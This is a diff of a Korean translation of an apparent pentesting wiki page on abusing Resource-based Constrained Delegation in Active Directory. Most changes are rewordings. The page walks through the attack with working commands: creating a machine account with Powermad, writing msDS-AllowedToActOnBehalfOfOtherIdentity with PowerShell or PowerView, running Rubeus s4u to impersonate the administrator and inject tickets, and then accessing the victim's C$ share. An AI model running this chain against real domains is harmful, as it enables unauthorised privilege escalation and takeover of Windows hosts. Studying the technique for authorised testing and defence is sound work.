@@ -21,18 +21,18 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Resource-based Constrained Delegation의 기초
 
-이것은 기본 [Constrained Delegation](constrained-delegation.md)와 유사하지만 **서비스에 대해 사용자를 가장할 수 있는 권한을 **객체**에 부여하는 대신**. Resource-based Constrained Delegation은 **그 객체에 대해 사용자를 가장할 수 있는 사람을 설정합니다**.
+이것은 기본 [Constrained Delegation](constrained-delegation.md)와 유사하지만 **서비스에 대해 사용자를 가장할 수 있는 권한을 **객체**에 부여하는 대신**. Resource-based Constrained Delegation은 **어떤 사용자가 그것에 대해 다른 사용자를 가장할 수 있는지를 객체에 설정합니다**.
 
-이 경우, 제약 객체는 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_라는 속성을 가지며, 이 속성에는 그 객체에 대해 다른 사용자를 가장할 수 있는 사용자의 이름이 포함됩니다.
+이 경우, 제약된 객체는 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_라는 속성을 가지며, 이 속성에는 그것에 대해 다른 사용자를 가장할 수 있는 사용자의 이름이 포함됩니다.
 
-이 제약 위임의 또 다른 중요한 차이점은 **기계 계정에 대한 쓰기 권한**(_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_)이 있는 모든 사용자가 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_를 설정할 수 있다는 것입니다 (다른 형태의 위임에서는 도메인 관리자 권한이 필요했습니다).
+이 Constrained Delegation과 다른 위임의 중요한 차이점은 **기계 계정에 대한 쓰기 권한**(_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_)을 가진 모든 사용자가 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_를 설정할 수 있다는 것입니다 (다른 형태의 위임에서는 도메인 관리자 권한이 필요했습니다).
 
 ### 새로운 개념
 
-제약 위임에서는 사용자의 _userAccountControl_ 값 내에 있는 **`TrustedToAuthForDelegation`** 플래그가 **S4U2Self**를 수행하는 데 필요하다고 언급되었습니다. 하지만 그것은 완전히 사실이 아닙니다.\
-실제로는 그 값이 없더라도 **서비스**(SPN이 있는 경우)인 경우에는 어떤 사용자에 대해서도 **S4U2Self**를 수행할 수 있지만, **`TrustedToAuthForDelegation`**가 있으면 반환된 TGS는 **Forwardable**이 되고, **그 플래그가 없으면** 반환된 TGS는 **Forwardable**이 **아닙니다**.
+Constrained Delegation에서는 사용자의 _userAccountControl_ 값 내에 있는 **`TrustedToAuthForDelegation`** 플래그가 **S4U2Self**를 수행하는 데 필요하다고 언급되었습니다. 하지만 그것은 완전히 사실이 아닙니다.\
+실제로는 그 값이 없더라도 **서비스**(SPN이 있는 경우)인 경우에는 어떤 사용자에 대해서도 **S4U2Self**를 수행할 수 있지만, **`TrustedToAuthForDelegation`**이 있는 경우 반환된 TGS는 **Forwardable**이 되고, **그 플래그가 없는 경우** 반환된 TGS는 **Forwardable**이 **아닙니다**.
 
-그러나 **S4U2Proxy**에서 사용되는 **TGS**가 **Forwardable이 아닐 경우**, 기본 제약 위임을 악용하려고 하면 **작동하지 않습니다**. 하지만 **Resource-Based constrain delegation**을 악용하려고 하면 **작동합니다**(이는 취약점이 아니라 기능입니다, 분명히).
+그러나 **S4U2Proxy**에서 사용되는 **TGS**가 **Forwardable이 아닌 경우** 기본 Constrained Delegation을 악용하려고 하면 **작동하지 않습니다**. 하지만 Resource-Based Constrained Delegation을 악용하려고 하면 **작동합니다**(이는 취약점이 아니라 기능입니다, 분명히).
 
 ### 공격 구조
 
@@ -40,12 +40,12 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 공격자가 이미 **희생자 컴퓨터에 대한 동등한 쓰기 권한**을 가지고 있다고 가정합니다.
 
-1. 공격자는 **SPN**이 있는 계정을 **타락시키거나** (“Service A”) **하나를 생성합니다**. **특별한 권한이 없는** _Admin User_는 최대 10개의 **Computer objects** (_**MachineAccountQuota**_)를 **생성**하고 **SPN**을 설정할 수 있습니다. 따라서 공격자는 단순히 컴퓨터 객체를 생성하고 SPN을 설정할 수 있습니다.
-2. 공격자는 희생자 컴퓨터(ServiceB)에 대한 **쓰기 권한**을 악용하여 **ServiceA가 해당 희생자 컴퓨터(ServiceB)에 대해 모든 사용자를 가장할 수 있도록 리소스 기반 제약 위임을 구성합니다**.
+1. 공격자는 **SPN**이 있는 계정을 **타락시키거나** 하나를 **생성**합니다 (“Service A”). **어떤** _관리자 사용자_도 특별한 권한 없이 최대 10개의 **컴퓨터 객체**(**_MachineAccountQuota_**)를 **생성**하고 **SPN**을 설정할 수 있습니다. 따라서 공격자는 단순히 컴퓨터 객체를 생성하고 SPN을 설정할 수 있습니다.
+2. 공격자는 희생자 컴퓨터(ServiceB)에 대한 **쓰기 권한**을 악용하여 **ServiceA가 해당 희생자 컴퓨터(ServiceB)에 대해 어떤 사용자도 가장할 수 있도록 리소스 기반 제약 위임을 구성합니다**.
 3. 공격자는 Rubeus를 사용하여 **특권 액세스가 있는 사용자**에 대해 Service A에서 Service B로 **전체 S4U 공격**(S4U2Self 및 S4U2Proxy)을 수행합니다.
-   1. S4U2Self (타락시키거나 생성한 SPN에서): **관리자에게 TGS 요청** (Forwardable 아님).
+   1. S4U2Self (타락시키거나 생성한 SPN에서): **관리자에게 TGS를 요청합니다** (Forwardable 아님).
    2. S4U2Proxy: 이전 단계의 **Forwardable이 아닌 TGS**를 사용하여 **희생자 호스트**에 대한 **관리자**의 **TGS**를 요청합니다.
-   3. Forwardable이 아닌 TGS를 사용하더라도 Resource-based constrained delegation을 악용하고 있으므로 작동합니다.
+   3. Forwardable이 아닌 TGS를 사용하더라도 Resource-based Constrained Delegation을 악용하고 있으므로 작동합니다.
    4. 공격자는 **티켓을 전달**하고 **사용자를 가장하여 희생자 ServiceB에 대한 **액세스**를 얻을 수 있습니다.
 
 도메인의 _**MachineAccountQuota**_를 확인하려면 다음을 사용할 수 있습니다:
@@ -56,7 +56,7 @@ Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select Ma
 
 ### 컴퓨터 객체 생성
 
-[Powermad](https://github.com/Kevin-Robertson/Powermad)**를 사용하여 도메인 내에 컴퓨터 객체를 생성할 수 있습니다:**
+[ powermad](https://github.com/Kevin-Robertson/Powermad)**를 사용하여 도메인 내에 컴퓨터 객체를 생성할 수 있습니다:**
 ```powershell
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -64,14 +64,14 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### 리소스 기반 제약 위임 구성
+### R**esource-based Constrained Delegation 구성하기**
 
-**activedirectory PowerShell 모듈 사용**
+**activedirectory PowerShell 모듈 사용하기**
 ```powershell
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
-**파워뷰 사용하기**
+**PowerView 사용하기**
 ```powershell
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -97,18 +97,18 @@ msds-allowedtoactonbehalfofotheridentity
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Rubeus의 `/altservice` 매개변수를 사용하여 한 번 요청하는 것만으로 더 많은 티켓을 생성할 수 있습니다:
+당신은 Rubeus의 `/altservice` 매개변수를 사용하여 한 번 요청하는 것만으로 더 많은 티켓을 생성할 수 있습니다:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 {% hint style="danger" %}
-사용자에게 "**위임할 수 없음**"이라는 속성이 있습니다. 사용자가 이 속성이 True로 설정되어 있으면, 그를 가장할 수 없습니다. 이 속성은 bloodhound 내에서 확인할 수 있습니다.
+사용자는 "**위임할 수 없음**"이라는 속성을 가지고 있습니다. 사용자가 이 속성이 True로 설정되어 있으면, 그를 가장할 수 없습니다. 이 속성은 bloodhound 내에서 확인할 수 있습니다.
 {% endhint %}
 
 ### 접근
 
 마지막 명령줄은 **완전한 S4U 공격을 수행하고 TGS를** 관리자에서 피해자 호스트의 **메모리**로 주입합니다.\
-이 예에서는 관리자로부터 **CIFS** 서비스에 대한 TGS가 요청되었으므로 **C$**에 접근할 수 있습니다:
+이 예제에서는 관리자로부터 **CIFS** 서비스에 대한 TGS가 요청되었으므로 **C$**에 접근할 수 있습니다:
 ```bash
 ls \\victim.domain.local\C$
 ```
